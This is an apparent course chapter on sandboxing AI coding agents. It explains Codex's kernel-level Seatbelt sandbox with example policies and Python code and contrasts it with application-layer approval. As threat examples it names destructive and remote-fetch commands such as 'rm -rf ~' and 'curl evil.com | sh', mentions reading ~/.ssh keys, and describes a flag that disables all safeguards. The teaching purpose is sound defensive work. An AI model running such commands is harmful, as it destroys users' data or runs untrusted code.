# s05: Sandbox — lock every command inside a kernel-level sandbox

> 🌐 **English** · [中文版](README.md)

> *"Claude Code blocks at the application layer; Codex locks at the kernel layer."*

[learn-codex overview](../README.en.md) · Previous: [s04 approval](../s04_approval/README.en.md) → **s05** → Next: [s06 AGENTS.md](../s06_agents_md/README.en.md)

---

## Get the idea straight first: why real security is "the kernel locking it down," not "the application blocking it"

This chapter is the backbone of the whole course. If you only remember one sentence, remember this: **Claude Code "blocks" at the application layer; Codex "locks" at the kernel layer.** But just memorizing it is useless — you have to grasp *why* it holds. The three principles below build on one another; once you've thought them through, you'll understand why Codex dares to run on a machine with nobody watching.

**Principle one: standing guard *inside* the door, you can never actually keep watch.**
In the previous chapter ([s04]) we used approval to intercept dangerous commands. But approval relies on the program itself reading the command and judging "is this one dangerous" — which amounts to letting **the program be its own gatekeeper**. The problem is that the ways of writing a command are endless, and the thing that actually deletes your files is not that string of command text at all — it's the process the command launches. The model can perfectly well write an innocent-looking `python build.py`, while `build.py` quietly runs `os.remove` on your secrets. The gatekeeper inspects "the note handed in at the door," but the harm is done *after* entering — **as long as the enforcement point sits inside the program, any child process it launches has a way to get around it**. That's the ceiling of "blocking": it intercepts text, but it can't intercept behavior.

**Principle two: move the enforcement point somewhere the process "can't reach" — the operating-system kernel.**
So where do you set the checkpoint so it can't be bypassed? You set it **one layer below any program, somewhere enforced by hardware and the kernel**. When your process wants to write a file or go online, it ultimately has to **ask** the operating system; the OS can simply answer "no." That's the sandbox: **before** launching the command, you first tell the kernel "for the process that's coming next, allow writes only to this one folder, deny everything else." After that, no matter how the process thrashes around, how it forks child processes, or what language it writes its scripts in, **every out-of-bounds write is rejected on the spot by the kernel** — it's not that the program "decides not to allow it," it's that the program **simply can't touch it**.
An analogy: approval is the lobby front desk having a visitor sign in (the front desk can be talked into it, or miss something); the sandbox is putting a **physical lock** directly on this office — you don't have the key, and no amount of smooth talking will open the door. The gatekeeper makes mistakes; the lock doesn't.

**Principle three: deny everything by default, then open up one rule at a time — rather than allow everything by default, then plug holes one at a time.**
The last clever bit is in how the "baseline" is chosen. The blacklist approach is "allow by default, block the bad ones as you meet them" (you'll never finish blocking). The sandbox flips it: **`(deny default)` — allow nothing by default, then explicitly open up only the minimum permissions this task *actually* needs** (reads can go anywhere, but writes are confined to the workspace). The power of this flip: if you **forget to block some dangerous operation** something bad happens, but if you **forget to open up some permission** the worst case is a command throwing an error — the direction of failure is safe. A security system should work exactly like this: deny by default, so that "a leak" turns into "a hiccup" rather than "a disaster."

Tie the three together: the application-layer gatekeeper can intercept text but not behavior (principle one), so you push the enforcement point down into the kernel, where the process can't get around it (principle two), and you start from "deny everything by default," opening up only the minimum necessary (principle three). Precisely because this checkpoint is **independent of any human, and independent of whether the model does something foolish**, Codex dares to let it run loose in scenarios with **no one to approve** — the `codex exec` headless mode, cloud agents, and the like.

## Problem

An agent runs arbitrary commands. The moment the model slips up (or is lured by an injected malicious instruction), a single `rm -rf ~` or `curl evil | sh` can spell disaster.

Can an application-layer blacklist stop it? It can't. The variants of a command are infinite: `rm -rf ~`, `rm -fr $HOME`, `find ~ -delete`, a Python script that deletes files… you can never enumerate them all.

Codex's answer: **don't try to enumerate bad commands; instead, restrict at the source what a command "can touch" — using kernel-enforced isolation.**

## Solution

On macOS, use **Seatbelt** (`/usr/bin/sandbox-exec`). The policy starts from `(deny default)` (deny everything by default), then opens up the minimum necessary permissions one at a time: reads can go anywhere, but **writes are allowed only within the "writable roots."**

```
sandbox-exec  -p '(version 1)
                  (deny default)            ← 关键：默认全拒
                  (allow process-exec)
                  (allow file-read*)        ← 读放开
                  (allow file-write* (subpath (param "WRITABLE_ROOT_0")))'
              -D WRITABLE_ROOT_0=/path/to/workspace   ← 可写根用参数注入
              -- /bin/sh -c "<命令>"
```

This faithfully mirrors the real source: the executable path `MACOS_PATH_TO_SEATBELT_EXECUTABLE = "/usr/bin/sandbox-exec"`, the `(deny default)` baseline ([seatbelt_base_policy.sbpl](../../codex/codex-rs/sandboxing/src/seatbelt_base_policy.sbpl)), and the writable roots injected via `-D` as `(param ...)` (`seatbelt.rs:602 create_seatbelt_command_args`).

On Linux, Codex switches to **Landlock + seccomp** (or bubblewrap); see `codex-rs/linux-sandbox`. This chapter's demo falls back to unsandboxed execution on non-macOS platforms and says so.

## How it works

Look at [code.py](code.py):

```python
def build_seatbelt_policy(n_writable_roots):
    lines = ["(version 1)", "(deny default)", "(allow process-exec)",
             "(allow file-read*)", ...]
    for i in range(n_writable_roots):
        lines.append(f'(allow file-write* (subpath (param "WRITABLE_ROOT_{i}")))')
    return "\n".join(lines)

def run_sandboxed(command, writable_roots):
    args = ["/usr/bin/sandbox-exec", "-p", policy]
    for i, root in enumerate(roots):
        args += ["-D", f"WRITABLE_ROOT_{i}={root}"]
    args += ["--", "/bin/sh", "-c", command]
    return subprocess.run(args, ...)
```

Then s01's `run_shell` is changed to call `run_sandboxed(command, writable_roots=[WORKDIR])` — every command the agent runs is locked inside the workspace.

**Walk through it** — take a command that tries to "jailbreak" and watch the kernel reject it on the spot. The workspace is set to `.../sandbox_demo`; now let the agent run a command that tries to write a file into the home directory:

```bash
touch /Users/ze/codex_escape_test.txt
```

Step one, `build_seatbelt_policy(1)` assembles a policy text — note that it starts from `(deny default)`, explicitly opening up only reads and "writes into the workspace":

```text
(version 1)
(deny default)                ← 默认全拒
(allow process-exec)
(allow file-read*)            ← 读放开
(allow file-write* (subpath (param "WRITABLE_ROOT_0")))   ← 写只准落在工作区
```

Step two, `run_sandboxed` assembles this policy, the writable roots injected via `-D`, and the command itself into an actual `sandbox-exec` invocation handed to the kernel:

```text
/usr/bin/sandbox-exec -p '<上面那份策略>' \
  -D WRITABLE_ROOT_0=/Users/.../sandbox_demo \
  -- /bin/sh -c "touch /Users/ze/codex_escape_test.txt"
```

Step three, the command actually runs, and the `touch` process really does try to write that home path — but the target is outside the workspace, matches no `file-write*` rule, and so falls into `(deny default)`, and **the kernel rejects this write syscall on the spot**:

```text
[exit 1] touch: /Users/ze/codex_escape_test.txt: Operation not permitted
实际检查：/Users/ze/codex_escape_test.txt 存在吗？ -> False
```

This is where the difference between "locking" and "blocking" becomes concrete: it is *not* that our Python code read the command and decided "this one wants to go out of bounds, I won't let it run" — the command **runs just fine**; it's the write operation it issued that gets rejected by the **kernel**, and the file **was never created at all**. A craftier wording (say, stuffing an `os.remove` into a Python script) is no different: as long as that process has no permission to write outside the workspace, it just can't touch it.

`--demo` shows it directly: a write inside the workspace succeeds, a write to the home directory is rejected by the kernel (`Operation not permitted`), and that file **really was not created**.

## Production-grade: a real sandbox, strict on four "defaults"

The teaching version's 8-line policy is enough for you to see the shape of "locking"; but a sandbox that **can go to production** is fierce precisely because several of its defaults all lean toward "safe" — and it's exactly these points that let Codex dare to run loose while unattended. (Line-level details are unpacked one by one in "Deep dive" below; here we just establish the principles.)

- **Deny everything by default (deny default); failure leans toward safety.** The policy opens with `(deny default)`, after which it allows **only** the necessary ones, one at a time. The beauty is in the **direction of failure**: if you forget to allow a permission, the worst case is a command erroring out (annoying, but safe); with the blacklist style of "allow by default, enumerate the bad ones," missing a single entry is a real out-of-bounds breach. `--demo` now prints the generated policy, so you can **count** exactly which rules were allowed.
- **No network by default.** The whole policy has not a single `network-*` allow → the kernel blocks all outbound traffic. What this stops is not "out-of-bounds writes" but **exfiltration**: even if the model runs `curl evil.com | sh` or tries to POST your secrets out, the connection simply can't be established. Going online requires an **explicit proxy + unix-socket allowlist** (the real source's `seatbelt_network_policy.sbpl` + `NetworkProxy`), not just punching a hole.
- **Read ≠ write, and reads aren't fully open either.** The teaching version takes the easy road with `(allow file-read*)`; the real Codex also has `unreadable_roots` / `restricted_read_only_platform_defaults.sbpl`, blocking even **reads** of sensitive paths like secrets — don't let the agent casually `cat` away your `~/.ssh`.
- **Decide per command whether to sandbox and which kind, rather than one-size-fits-all.** The real Codex picks per command based on "this command + the approval verdict + the platform": macOS uses Seatbelt, Linux uses Landlock+seccomp (falling back to `bwrap`), Windows uses a restricted token (the four variants of `SandboxType`); a command explicitly allowed by execpolicy can even `bypass_sandbox` and run directly (approval and sandboxing are orthogonal, [s04]).

> In one sentence: **make "safe" the default, make "allowing" the exception, and let every default lean toward "no disaster even when something goes wrong."** "Deep dive" below maps these four points to line numbers in the real source.

## 🆚 How it differs from Claude Code

| | Claude Code | Codex |
|---|---|---|
| Primary line of defense | Approval prompt + workspace-path validation (**application layer**) | Kernel-enforced sandbox (Seatbelt / Landlock, **kernel layer**) |
| Trust model | Trust the model + let the user gatekeep | Don't trust by default; defense in depth |
| Out-of-bounds write to home | Intercepted by path checks in the tool code | Kernel rejects it directly; even a child process outside `sandbox-exec` can't escape |
| Suited scenarios | Leans interactive, centered on approval UX | Also suits low/no-human-approval headless / CI / cloud |

**Why the difference?** It comes down to assumptions about autonomy and the runtime scenario:

- Codex wants to run safely even with **almost nobody watching** (the `codex exec` headless mode, cloud agents). When there's no one to approve, the only reliable line of defense is to **push security down into the kernel** — even if the model goes completely off the rails, the kernel won't let it cross the line.
- Claude Code is more centered on **interactive approval**: dangerous operations pop a prompt asking you, with the human as the last checkpoint.

Note: both **have** an approval mechanism (Codex's approval policy is [s04], orthogonal to the sandbox). The difference is *where* the "first, and human-independent, line of defense" sits — Codex puts it in the kernel, which is its most distinctive engineering orientation.

[s04]: ../s04_approval/README.en.md

## Deep dive: teaching version vs the real Codex source

The teaching version's SBPL policy is just 8 lines. The real Codex sandbox lives in [`sandboxing/`](../../codex/codex-rs/sandboxing/) + [`linux-sandbox/`](../../codex/codex-rs/linux-sandbox/), and is far more complex.

<details>
<summary>1. How large the real Seatbelt policy is</summary>

`seatbelt_base_policy.sbpl` is **123 lines** just for the baseline, on top of which it layers the network policy (`seatbelt_network_policy.sbpl`), unix-socket rules, read-only subpath exclusions within the writable roots, and protection for metadata like `.git`. `create_seatbelt_command_args` (`seatbelt.rs:602`) dynamically assembles all of this at runtime.

</details>

<details>
<summary>2. Even "reads" aren't fully opened up</summary>

The teaching version takes the easy road and fully opens reads with `(allow file-read*)`. The real Codex supports `unreadable_roots` and `restricted_read_only_platform_defaults.sbpl`, restricting reads of sensitive paths — don't let the agent casually `cat` away your secrets.

</details>

<details>
<summary>3. Linux takes a completely different route</summary>

macOS uses Seatbelt; **Linux uses Landlock (LSM) + seccomp** to filter syscalls, or falls back to bubblewrap (`bwrap`). See `linux-sandbox/` and `sandboxing/src/landlock.rs`, `bwrap.rs`. The `SandboxType` enum: `None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken` — one approval policy, four kernel implementations.

</details>

<details>
<summary>4. The network is locked outside too</summary>

The teaching version only handles file writes. The real Codex's network sandbox **denies outbound traffic by default**, can open up precise per-host access, and has mechanisms like an MITM proxy readable root. This way, even if the model wants to `curl evil.com | sh`, the connection itself can't be established.

</details>

<details>
<summary>5. How the sandbox connects to approval: bypass_sandbox and "picking the sandbox per command"</summary>

In the teaching version, the "sandbox" is a fixed single layer — every command uses the same policy via `run_sandboxed`. The real Codex turns "whether this command enters a sandbox at all, and which kind" into a **per-command decision**, and one that is **linked** to the previous chapter's ([s04]) approval verdict:

- The approval ruling gets wrapped into an `ExecApprovalRequirement` (`core/src/tools/sandboxing.rs`). Within it, the `bypass_sandbox` field in the `Skip { bypass_sandbox, .. }` branch determines that a command **explicitly allowed** by execpolicy can **skip the sandbox entirely** and run directly — this is exactly where "approval and sandboxing are orthogonal" lands at the type level: approval merely lets it through the door; whether to wrap it in another layer of kernel constraint is a separate, independent switch.
- Which kernel implementation actually gets applied is determined by `SandboxType` (`None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken`), chosen per platform at runtime; writable roots, network allowances, read-only exclusions, and so on are all dynamically assembled into the policy at this step.
- There's also a "none of the above" escape hatch: `--dangerously-bypass-approvals-and-sandbox` (colloquially YOLO mode) turns off **both** approval and the sandbox at once. It exists for certain trusted automation scenarios, but it amounts to dismantling both lines of defense from this chapter and the previous one together — use it only when you fully understand the consequences.

In one sentence: the teaching version is "one-size-fits-all, everything enters the same sandbox," while the real Codex is "**per command, per approval verdict, per platform**, deciding case by case whether to lock it down and which kind."

</details>

## Run

```bash
python s05_sandbox/code.py --demo   # 不需要模型：打印生成的策略 + 演示「区内放行 / 区外拦截」
python s05_sandbox/code.py          # 交互模式：shell 命令都被沙箱关在工作区
```

> macOS will print a `sandbox-exec: ... is deprecated` warning — that's a system notice; the functionality still works, and the real Codex uses it just the same. After the demo finishes, it **automatically cleans up** the `sandbox_demo/` workspace (consistent with the other chapters).

## Recap

- **Locking vs blocking**: the application layer can only read command text to "block," intercepting text but not behavior (a single `python x.py` gets around it); the kernel layer "locks" somewhere the process can't get around, so the command runs but the out-of-bounds operation is rejected on the spot by the kernel.
- So the enforcement point must be **pushed down into the kernel**: don't enumerate bad commands; restrict at the source what a command "can touch."
- The baseline picks `(deny default)` — deny everything by default, open up only the minimum necessary (reads open, writes confined to the writable roots). The beauty is that **the direction of failure is safe**: forgetting to open a permission at worst errors out a command; only forgetting to block a dangerous operation leads to disaster.
- This checkpoint is **independent of any human, and independent of whether the model does something foolish**, which is why Codex dares to run loose in headless / CI / cloud with no one to approve — its most distinctive divide from Claude Code.
- For production-grade, look at the four "defaults": deny everything by default (fail closed), no network by default, read ≠ write with reads also limited, and pick the sandbox per command — **safety is the default, allowing is the exception** (see the "Production-grade" section).
- Next stop [s06](../s06_agents_md/README.en.md): let the project write its own rules into a file, and the agent reads them in, layered along the directory tree.
- Back to the [overview](../README.en.md) for the full 17-chapter roadmap.

## Think it over

<div class="think">

1. The sandbox stops "out-of-bounds writes," but what if the model `cat`s `~/.ssh/id_rsa` to print the secret into the output, then finds a way to exfiltrate it? Is a file sandbox alone enough? Which other layers do you also need?
2. Starting from `(deny default)` means every permission you open up has to be written out explicitly — safe, but tedious. If some legitimate command won't run because it's missing a rule, will you "open up a bit more" or "stay locked down"? On what basis?
3. Claude Code relies on human approval; Codex relies on the kernel locking it down. When an agent has to run in **unattended** CI, which of these two paths is more trustworthy? Why?
4. The sandbox (kernel-enforced) and approval (a human nodding) are two orthogonal layers. Could you have just one of them? In what scenario would you turn off both (`--dangerously-bypass`), and why is that so dangerous?

</div>
